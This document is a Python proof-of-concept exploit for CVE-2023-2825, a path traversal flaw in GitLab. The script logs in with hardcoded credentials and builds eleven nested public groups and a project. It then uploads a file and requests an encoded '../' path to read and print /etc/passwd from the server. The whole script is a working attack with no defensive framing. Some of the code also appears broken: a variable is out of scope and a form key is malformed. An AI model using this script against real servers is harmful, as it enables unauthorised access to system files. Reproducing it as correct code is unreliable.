import requests
import random
import string
from urllib.parse import urlparse
from bs4 import BeautifulSoup

ENDPOINT = "https://gitlab.example.com"
USERNAME = "root"
PASSWORD = "toor"


class GitLabExploit:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = ""

    def send_request(self, method, path, data=None, files=None, headers=None):
        if method == "POST" and isinstance(data, dict):
            data["authenticity_token"] = self.csrf_token

        response = self.session.request(
            method,
            f"{ENDPOINT}{path}",
            data=data,
            files=files,
            headers=headers,
            verify=False,
        )

        if response.status_code != 200:
            print(response.text)
            print(f"[*] Request failed: {method} - {path} => {response.status_code}")
            exit(1)

        if response.headers["content-type"].startswith("text/html"):
            self.csrf_token = BeautifulSoup(response.text, "html.parser").find(
                "meta", {"name": "csrf-token"}
            )["content"]

        return response

    def login(self):
        print("[*] Attempting to login...")
        self.send_request(
            "POST",
            "/users/sign_in",
            data={"user[login]": USERNAME, "user[password]": PASSWORD},
        )
        print(f"[*] Login successful as user '{USERNAME}'")

    def create_groups(self):
        group_prefix = "".join(random.choices(string.ascii_uppercase + string.digits, k=3))
        print(f"[*] Creating 11 groups with prefix {group_prefix}")

        parent_id = ""
        for i in range(1, 12):
            # Create group
            name = f"{group_prefix}-{i}"
            create_resp = self.send_request(
                "POST",
                "/groups",
                data={
                    "group[parent_id]": parent_id,
                    "group[name]": name,
                    "group[path]": name,
                    "group[visibility_level]": 20,
                    "user[role]": "software_developer",
                    "group[jobs_to_be_done]": "",
                },
            )

            # Get group id
            parent_id = BeautifulSoup(create_resp.text, "html.parser").find(
                "button", {"title": "Copy group ID"}
            )["data-clipboard-text"]

            print(f"[*] Created group '{name}'")

    def create_project(self):
        project_resp = self.send_request(
            "POST",
            "/projects",
            data={
                "project[ci_cd_only]": "false",
                "project[name]": "CVE-2023-2825",
                "project[selected_namespace_id]": parent_id,
                "project[namespace_id]": parent_id,
                "project[path]": "CVE-2023-2825",
                "project[visibility_level]": 20,
                "project[initialize_with_readme": 1,
            },
        )
        repo_path = urlparse(project_resp.url).path
        print(f"[*] Created public repo '{repo_path}'")
        return repo_path

    def upload_file(self, repo_path):
        file_resp = self.send_request(
            "POST",
            f"/{repo_path}/uploads",
            files={"file": "hello world"},
            headers={"X-CSRF-Token": self.csrf_token},
        )
        file_url = file_resp.json()["link"]["url"]
        print(f"[*] Uploaded file '{file_url}'")
        return file_url

    def exploit(self, repo_path, file_url):
        exploit_path = f"/{repo_path}{file_url.split('file')[0]}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
        print(f"[*] Executing exploit, fetching file '/etc/passwd': GET - {exploit_path}")
        exploit_resp = self.send_request("GET", exploit_path)
        print(f"\n{exploit_resp.text}")

    def run_exploit(self):
        # Get initial CSRF token
        self.send_request("GET", "")

        self.login()
        self.create_groups()
        repo_path = self.create_project()
        file_url = self.upload_file(repo_path)
        self.exploit(repo_path, file_url)


if __name__ == "__main__":
    exploit = GitLabExploit()
    exploit.run_exploit()
